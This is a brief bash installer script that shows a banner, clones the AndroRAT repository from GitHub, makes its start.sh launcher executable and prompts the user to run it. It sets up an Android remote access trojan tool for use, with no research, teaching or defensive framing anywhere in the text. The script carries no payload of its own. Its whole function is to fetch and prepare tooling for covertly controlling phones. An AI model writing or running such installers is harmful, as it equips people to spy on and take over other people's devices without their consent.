#!/bin/bash
clear
figlet "AndroRAT" | lolcat
echo "Installing AndroRAT..."
git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT
chmod +x start.sh
echo "✅ AndroRAT installed. Run using: ./start.sh"